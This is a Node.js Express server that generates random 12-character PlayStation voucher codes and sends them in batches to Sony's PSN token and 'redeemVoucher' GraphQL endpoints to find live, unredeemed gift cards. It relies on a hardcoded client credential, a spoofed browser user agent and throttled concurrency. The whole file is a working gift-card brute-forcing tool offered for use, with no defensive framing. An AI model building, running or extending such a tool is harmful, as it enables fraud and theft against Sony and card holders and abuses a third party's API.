import express from 'express';
import crypto from 'node:crypto';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/* ============================================================
   TUNABLES — everything that could ever need changing is here.
   Sony rotates these occasionally. See README > "If checking breaks".
   ============================================================ */
const CHARSET = (process.env.CODE_CHARSET || 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789').toUpperCase();
const MAX_BATCH = clampInt(process.env.MAX_BATCH, 1, 200, 50);
const TOKEN_URL = 'https://ca.account.sony.com/api/authz/v3/oauth/token';
const GRAPHQL_URL = 'https://web.np.playstation.com/api/graphql/v1/op';
const CLIENT_BASIC = process.env.PSN_CLIENT_BASIC || 'MDQ4Mjg5NzY6cExacUZQNGd6aXpTb2JxN2N6VlF0S1FqeWlKb0Y=';
const SCOPE = process.env.PSN_SCOPE || 'psn:mobile.v2.core psn:clientapp';
const LOCALE = process.env.PSN_LOCALE || 'en-US';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36';
const TIMEOUT_MS = 12000;
const CONCURRENCY = 3;
const GAP_MS = 320;

const app = express();
const PORT = Number(process.env.PORT || 3000);

app.disable('x-powered-by');
app.use(express.json({ limit: '128kb' }));
app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1h' }));

/* ---------------- helpers ---------------- */

function clampInt(v, min, max, dflt) {
  const n = Number.parseInt(v, 10);
  if (Number.isNaN(n)) return dflt;
  return Math.min(max, Math.max(min, n));
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function fetchT(url, opts = {}, ms = TIMEOUT_MS) {
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), ms);
  try {
    return await fetch(url, { ...opts, signal: ac.signal });
  } finally {
    clearTimeout(timer);
  }
}

function makeCode(charset) {
  let raw = '';
  for (let i = 0; i < 12; i++) raw += charset[crypto.randomInt(charset.length)];
  return raw.replace(/(.{4})(?=.)/g, '$1-');
}

function normalise(code) {
  return String(code || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
}

async function mapPool(items, limit, fn) {
  const out = new Array(items.length);
  let cursor = 0;
  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
    while (cursor < items.length) {
      const i = cursor++;
      out[i] = await fn(items[i], i);
      await sleep(GAP_MS);
    }
  });
  await Promise.all(workers);
  return out;
}

/* ---------------- Sony auth ---------------- */

let token = { value: null, exp: 0 };

async function getToken(force = false) {
  if (!force && token.value && Date.now() < token.exp) return token.value;

  const res = await fetchT(TOKEN_URL, {
    method: 'POST',
    headers: {
      Authorization: `Basic ${CLIENT_BASIC}`,
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': UA
    },
    body: new URLSearchParams({ grant_type: 'client_credentials', scope: SCOPE })
  });

  const text = await res.text();
  if (!res.ok) throw new Error(`token ${res.status}: ${text.slice(0, 200)}`);

  let json;
  try { json = JSON.parse(text); } catch { throw new Error('token: non-JSON response'); }
  if (!json.access_token) throw new Error('token: no access_token in response');

  token = {
    value: json.access_token,
    exp: Date.now() + Math.max(60, (json.expires_in || 3600) - 120) * 1000
  };
  return token.value;
}

/* ---------------- voucher check ---------------- */

const MUTATION = `mutation redeemVoucher($voucherCode: String!) {
  redeemVoucher(voucherCode: $voucherCode) {
    __typename
    ... on RestUniversalRedeemVoucherResponse {
      voucher { voucherId status }
    }
  }
}`;

function classify(status, json) {
  const errs = json?.errors || [];
  const blob = JSON.stringify(errs).toLowerCase();
  const voucher = json?.data?.redeemVoucher?.voucher;

  if (/already|used/.test(blob)) return { status: 'USED', detail: 'Code already redeemed' };
  if (/expired/.test(blob)) return { status: 'EXPIRED', detail: 'Code expired' };
  if (/not\s*found|invalid|unknown|malformed/.test(blob)) return { status: 'INVALID', detail: 'No card matches this code' };
  if (voucher) return { status: 'VALID', detail: 'Live, unredeemed code' };
  if (errs.length) return { status: 'UNVERIFIED', detail: errs[0]?.message?.slice(0, 160) || 'Unexpected Sony reply' };
  if (status === 401 || status === 403) return { status: 'UNVERIFIED', detail: 'Sony rejected the token' };
  return { status: 'UNVERIFIED', detail: `HTTP ${status}` };
}

async function checkOne(code) {
  const clean = normalise(code);
  if (clean.length !== 12) return { code, status: 'INVALID', detail: 'Wrong length (needs 12 chars)' };

  try {
    const bearer = await getToken();
    const res = await fetchT(`${GRAPHQL_URL}?operationName=redeemVoucher`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${bearer}`,
        'Content-Type': 'application/json',
        'X-PSN-Store-Locale': LOCALE,
        'apollographql-client-name': 'PSN-WEB',
        'User-Agent': UA,
        Accept: 'application/json'
      },
      body: JSON.stringify({ operationName: 'redeemVoucher', variables: { voucherCode: clean }, query: MUTATION })
    });

    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch { /* leave null */ }

    if ((res.status === 401 || res.status === 403) && json) {
      // token may have gone stale mid-run — retry once with a fresh one
      try { await getToken(true); } catch { /* fall through */ }
    }

    const verdict = classify(res.status, json);
    return { code, ...verdict };
  } catch (err) {
    return { code, status: 'UNVERIFIED', detail: String(err.message || err).slice(0, 160) };
  }
}

/* ---------------- routes ---------------- */

app.get('/api/health', (_req, res) => res.json({ ok: true, charset: CHARSET, maxBatch: MAX_BATCH }));

app.get('/api/selfcheck', async (_req, res) => {
  const started = Date.now();
  try {
    await getToken(true);
    res.json({ ok: true, ms: Date.now() - started, note: 'Sony accepted the credentials' });
  } catch (err) {
    res.status(502).json({ ok: false, ms: Date.now() - started, error: String(err.message || err) });
  }
});

app.post('/api/generate', (req, res) => {
  const count = clampInt(req.body?.count, 1, MAX_BATCH, 10);
  const ambiguous = new Set('IO01');
  const drop = req.body?.excludeAmbiguous !== false;

  let set = CHARSET.split('');
  if (drop) set = set.filter((c) => !ambiguous.has(c));
  if (set.length < 10) set = CHARSET.split('');
  const charset = set.join('');

  const seen = new Set();
  const codes = [];
  while (codes.length < count) {
    const c = makeCode(charset);
    if (seen.has(c)) continue;
    seen.add(c);
    codes.push(c);
  }
  res.json({ codes });
});

app.post('/api/verify', async (req, res) => {
  const list = Array.isArray(req.body?.codes) ? req.body.codes.slice(0, MAX_BATCH) : [];
  if (!list.length) return res.status(400).json({ error: 'send { codes: [...] }' });

  const results = await mapPool(list, CONCURRENCY, (c) => checkOne(c));
  res.json({ results });
});

app.use((_req, res) => res.status(404).json({ error: 'not found' }));

app.listen(PORT, '0.0.0.0', () => console.log(`listening on ${PORT}`));
